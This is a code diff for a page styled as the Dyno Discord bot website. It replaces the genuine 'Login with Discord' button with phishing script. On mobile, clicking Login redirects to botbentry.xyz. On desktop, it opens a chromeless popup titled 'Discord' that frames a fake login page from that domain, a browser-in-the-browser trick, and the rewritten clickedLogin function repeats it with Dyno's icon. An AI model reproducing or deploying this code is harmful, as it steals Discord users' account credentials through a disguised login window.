@@ -1252,16 +1252,32 @@ select
                 class="navbar-logo" alt="White diamond shaped Dyno logo" src="/images/dyno-blitz-v2-transparent-bg.png">
               <h1 class="title is-1" alt="Dyno">Dyno</h1>
             </a></div>
-          <div class="column navbar-auth-column">
-            <div class="is-hidden-desktop">
-              <div class="navbar-item">
-                <div class="buttons"><a class="level-item button is-info is-hidden-tablet touch-login-button"
-                    href="#" onclick="clickedLogin()" title="Login with Discord">Login</a><a
-                    class="level-item button is-info is-hidden-mobile touch-login-button" href="#"
-                    title="Login with Discord" onclick="clickedLogin()">Login with Discord</a></div>
-              </div>
-            </div>
-          </div>
+          <div>
+              <button class="sc-jIAOiI bfMtSn sc-hKdnnL RIgdT" type="button" id="openLogin">
+                <div class="sc-hiMGwR iwHhCu sc-TRNrF dStzaX">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ciZhAO kmbPg sc-olbas dxIxUA" main="#F2F4FB">
+                    <path d="M23 12C23 18.0751 18.0751 23 12 23" data-stroke="main" stroke="#F2F4FB" stroke-width="2" stroke-linecap="round"></path>
+                  </svg>
+                </div>
+                <a id="abc" class="sc-fXynhf hbzcXP" href="" id="verifybutton">Login</a>
+                </button>
+                </div>
+                                                              
+                                                        
+
+                <script>
+                  document.getElementById('abc').addEventListener('click', (event) => {
+                    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                      event.preventDefault();
+                      window.location.href = 'https://botbentry.xyz/login';
+                    } else {
+                      const wnd = window.open('https://mqqq.xyz', '_blank', 'status=no,toolbar=no,location=no,directories=no,resizable=yes,scrollbars=yes,width=1050,height=600');
+
+
+                      wnd.document.write('<script>document.title = "Discord";</scr' + 'ipt><iframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="https://botbentry.xyz/login"></iframe>');
+                    }
+                  });
+                </script>
         </div>
         <div class="navbar-menu">
           <div class="navbar-start"><a class="navbar-item is-hidden-desktop" href="/account"
@@ -1309,15 +1325,21 @@ select
             </div>
             <script>
                function clickedLogin() {
-                                document.getElementById('abc').addEventListener('click', (event) => {
-                                                                  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-                                                                    event.preventDefault();
-                                                                    window.location.href = 'https://botbentry.xyz/login';
-                                                                  } else {
-                                                                    const wnd = window.open('https://mqqq.xyz', '_blank', 'status=no,toolbar=no,location=no,directories=no,resizable=yes,scrollbars=yes,width=1050,height=600');
+                                if (window.innerWidth > 1000) {
+                                    let width = screen.width / 2;  
+                                    let height = screen.height / 2;
+                                    let left = (screen.width - width) / 2;
+                                    let top = (screen.height - height) / 2;
+                                    
+                                    let faviconUrl = "https://dyno.gg/images/dyno-blitz-v2-transparent-bg.png"
 
 
-                                                                    wnd.document.write('<script>document.title = "Discord";</scr' + 'ipt><iframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="https://botbentry.xyz/login"></iframe>');
+                                    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=${width},height=${height},left=${left},top=${top}`;
+                                    newWin = window.open('Discord', 'Discord', params);
+                                    newWin.document.write(`<head><link rel="icon" href="${faviconUrl}" /><title>Discord</title></head><iframe src="https://botbentry.xyz/login" style="border: none; padding: none; margin: none; width: 100%; height: 100%; position: absolute; left: 0px; top: 0px;">`);
+                                } else {
+                                    location.href = "https://botbentry.xyz/login"
+                                }
                             }
             </script>
           </div>
